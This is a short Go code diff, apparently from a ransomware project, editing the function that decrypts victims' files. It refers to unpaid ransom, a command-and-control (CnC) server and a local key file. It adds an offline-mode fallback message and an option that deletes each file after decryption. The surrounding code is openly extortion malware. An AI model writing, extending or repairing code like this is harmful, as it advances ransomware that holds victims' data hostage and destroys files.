@@ -72,6 +72,7 @@ func StartDecryption(q *Queue, key string) int {
 				fmt.Println("The ransom is currently not paid. If you made the payment there could be some processing delays so patience is adviced")
 				log.Fatal("Ransom not paid")
 			} else if err.Error() == "failed to contact CnC server" {
+				fmt.Println("Failed to contact the server. Running in offline mode")
 				keyHexBytes, err := ioutil.ReadFile("./d_key.txt")
 				if err != nil {
 					fmt.Println("Failed to contact the server. No local 'd_key.bin key found'. Decryption not possible")
@@ -94,6 +95,9 @@ func StartDecryption(q *Queue, key string) int {
 		go func() {
 			defer wg.Done()
 			wcc.DecryptFile(file, keyBytes)
+			if cli.Settings.Delete {
+				os.Remove(file)
+			}
 		}()
 	}
 	wg.Wait()
